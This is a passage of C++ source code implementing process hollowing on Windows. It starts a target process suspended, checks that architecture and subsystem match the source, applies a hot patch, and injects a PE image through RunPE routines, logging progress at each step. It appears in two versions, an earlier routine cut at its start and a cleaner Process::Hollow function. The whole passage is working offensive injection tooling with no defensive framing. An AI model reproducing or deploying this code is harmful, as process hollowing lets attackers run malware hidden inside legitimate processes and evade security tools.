	}
	else {
		ProcessAddressInformation = GetProcessAddressInformation64(&PI);
		if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr) {
			 printf("[-] An error occurred when trying to get the image base address of the target process!\n");
			CleanAndExitProcess(&PI, hFileContent);
			return FALSE;
		}
	}

	const BOOL bSource32 = IsPE32(hFileContent);
	
	if (bSource32)
		 printf("[+] Source PE Image architecture: x86\n");
	else
		 printf("[+] Source PE Image architecture: x64\n");

	if (bTarget32)
		 printf("[+] Target PE Image architecture: x86\n");
	else
		 printf("[+] Target PE Image architecture: x64\n");

	if ((bSource32 && bTarget32) || (!bSource32 && !bTarget32))
		 printf("[+] Architectures are compatible!\n");
	else {
		 printf("[-] Architectures are not compatible!\n");
		 return FALSE;
	}

	if (!Patch::ApplyNtManageHotPatch(bSource32, PI.hProcess))
	{
		printf("[-] An error occurred when trying to apply the hot patch.\n");
		return FALSE;
	}
	

	DWORD dwSourceSubsystem;
	if (bSource32)
		dwSourceSubsystem = GetSubsytem32(hFileContent);
	else
		dwSourceSubsystem = GetSubsytem64(hFileContent);

	if (dwSourceSubsystem == (DWORD)-1) {
		 printf("[-] An error occurred when trying to get the subsystem of the source image.\n");
		CleanAndExitProcess(&PI, hFileContent);
		return FALSE;
	}

	 printf("[+] Source Image subsystem: 0x%X\n", (UINT)dwSourceSubsystem);

	DWORD dwTargetSubsystem;
	if (bTarget32)
		dwTargetSubsystem = GetSubsystemEx32(PI.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);
	else
		dwTargetSubsystem = GetSubsystemEx64(PI.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);

	if (dwTargetSubsystem == (DWORD)-1) {
		 printf("[-] An error occurred when trying to get the subsystem of the target process.\n");
		CleanAndExitProcess(&PI, hFileContent);
		return FALSE;
	}

	 printf("[+] Target Process subsystem: 0x%X\n", (UINT)dwTargetSubsystem);

	if (dwSourceSubsystem == dwTargetSubsystem)
		bool fuck;
	else {
		 printf("[-] Subsystems are not compatible.\n");
		CleanAndExitProcess(&PI, hFileContent);
		return FALSE;
	}

	BOOL bHasReloc;
	if (bSource32)
		bHasReloc = HasRelocation32(hFileContent);
	else
		bHasReloc = HasRelocation64(hFileContent);

	
	if (!bHasReloc)
		 printf("[+] The source image doesn't have a relocation table.\n");
	else
		 printf("[+] The source image has a relocation table.\n");
	

	if (bSource32 && !bHasReloc) {
		if (RunPE32(&PI, hFileContent)) {
			 printf("[+] The injection has succeeded!\n");
			CleanProcess(&PI, hFileContent);
			return TRUE;
		}
	}

	if (bSource32 && bHasReloc) {
		if (RunPEReloc32(&PI, hFileContent)) {
			printf("[+] The injection has succeeded!\n");
			CleanProcess(&PI, hFileContent);
			return TRUE;
		}
	}

	if (!bSource32 && !bHasReloc) {
		if (RunPE64(&PI, hFileContent)) {
			printf("[+] The injection has succeeded!\n");
			CleanProcess(&PI, hFileContent);
			return TRUE;
		}
	}

	if (!bSource32 && bHasReloc) {
		if (RunPEReloc64(&PI, hFileContent)) {
			printf("[+] The injection has succeeded!\n");
			CleanProcess(&PI, hFileContent);
			return TRUE;
		}
	}

	printf("[-] The injection has failed!\n");

	if (hFileContent != nullptr)
		HeapFree(GetProcessHeap(), 0, hFileContent);

	if (PI.hThread != nullptr)
		CloseHandle(PI.hThread);

	if (PI.hProcess != nullptr) {
		TerminateProcess(PI.hProcess, -1);
		CloseHandle(PI.hProcess);
	}

	return FALSE;
}

BOOL Process::Hollow(const LPSTR lpSourceImage, const LPSTR lpTargetProcess)
{
	// Validate input parameters
	if (!lpSourceImage || !lpTargetProcess)
	{
		printf("[-] Invalid arguments.\n");
		return FALSE;
	}

	// Load and validate PE file
	const LPVOID hFileContent = GetFileContent(lpSourceImage);
	if (!hFileContent)
	{
		printf("[-] Failed to load PE file content.\n");
		return FALSE;
	}

	printf("[+] PE file content: 0x%p\n", hFileContent);

	if (!IsValidPE(hFileContent))
	{
		printf("[-] Invalid PE file format.\n");
		HeapFree(GetProcessHeap(), 0, hFileContent);
		return FALSE;
	}

	printf("[+] PE file validation successful.\n");

	// Create target process in suspended state
	STARTUPINFOA si = { 0 };
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi = { 0 };

	if (!CreateProcessA(lpTargetProcess, nullptr, nullptr, nullptr, TRUE,
		CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
	{
		printf("[-] Failed to create target process.\n");
		CleanAndExitProcess(&pi, hFileContent);
		return FALSE;
	}

	printf("[+] Target process created successfully (PID: %lu).\n", pi.dwProcessId);

	// Determine target process architecture
	BOOL bIsTarget32Bit = FALSE;
	IsWow64Process(pi.hProcess, &bIsTarget32Bit);

	// Get target process address information
	ProcessAddressInformation addrInfo = bIsTarget32Bit
		? GetProcessAddressInformation32(&pi)
		: GetProcessAddressInformation64(&pi);

	if (!addrInfo.lpProcessImageBaseAddress || !addrInfo.lpProcessPEBAddress)
	{
		printf("[-] Failed to retrieve target process image base address.\n");
		CleanAndExitProcess(&pi, hFileContent);
		return FALSE;
	}

	printf("[+] Target Process PEB: 0x%p\n", addrInfo.lpProcessPEBAddress);
	printf("[+] Target Process Image Base: 0x%p\n", addrInfo.lpProcessImageBaseAddress);

	// Validate architecture compatibility
	const BOOL bIsSource32Bit = IsPE32(hFileContent);
	printf("[+] Source PE architecture: %s\n", bIsSource32Bit ? "x86" : "x64");
	printf("[+] Target PE architecture: %s\n", bIsTarget32Bit ? "x86" : "x64");

	if (bIsSource32Bit != bIsTarget32Bit)
	{
		printf("[-] Architecture mismatch - incompatible.\n");
		CleanAndExitProcess(&pi, hFileContent);
		return FALSE;
	}

	printf("[+] Architectures are compatible.\n");

	// Apply hot patch
	if (!Patch::ApplyNtManageHotPatch(bIsSource32Bit, pi.hProcess))
	{
		printf("[-] Failed to apply hot patch.\n");
		CleanAndExitProcess(&pi, hFileContent);
		return FALSE;
	}

	// Validate subsystem compatibility
	const DWORD dwSourceSubsystem = bIsSource32Bit
		? GetSubsytem32(hFileContent)
		: GetSubsytem64(hFileContent);

	if (dwSourceSubsystem == (DWORD)-1)
	{
		printf("[-] Failed to retrieve source image subsystem.\n");
		CleanAndExitProcess(&pi, hFileContent);
		return FALSE;
	}

	const DWORD dwTargetSubsystem = bIsTarget32Bit
		? GetSubsystemEx32(pi.hProcess, addrInfo.lpProcessImageBaseAddress)
		: GetSubsystemEx64(pi.hProcess, addrInfo.lpProcessImageBaseAddress);

	if (dwTargetSubsystem == (DWORD)-1)
	{
		printf("[-] Failed to retrieve target process subsystem.\n");
		CleanAndExitProcess(&pi, hFileContent);
		return FALSE;
	}

	printf("[+] Source subsystem: 0x%X\n", dwSourceSubsystem);
	printf("[+] Target subsystem: 0x%X\n", dwTargetSubsystem);

	if (dwSourceSubsystem != dwTargetSubsystem)
	{
		printf("[-] Subsystem mismatch - incompatible.\n");
		CleanAndExitProcess(&pi, hFileContent);
		return FALSE;
	}

	printf("[+] Subsystems are compatible.\n");

	// Check for relocation table
	const BOOL bHasRelocation = bIsSource32Bit
		? HasRelocation32(hFileContent)
		: HasRelocation64(hFileContent);

	printf("[+] Relocation table: %s\n", bHasRelocation ? "present" : "not present");

	// Execute injection based on architecture and relocation
	BOOL bInjectionSuccess = FALSE;

	if (bIsSource32Bit)
	{
		bInjectionSuccess = bHasRelocation
			? RunPEReloc32(&pi, hFileContent)
			: RunPE32(&pi, hFileContent);
	}
	else
	{
		bInjectionSuccess = bHasRelocation
			? RunPEReloc64(&pi, hFileContent)
			: RunPE64(&pi, hFileContent);
	}

	// Handle injection result
	if (bInjectionSuccess)
	{
		printf("[+] Process hollowing succeeded!\n");
		CleanProcess(&pi, hFileContent);
		return TRUE;
	}

	printf("[-] Process hollowing failed.\n");
	CleanAndExitProcess(&pi, hFileContent);
	return FALSE;
}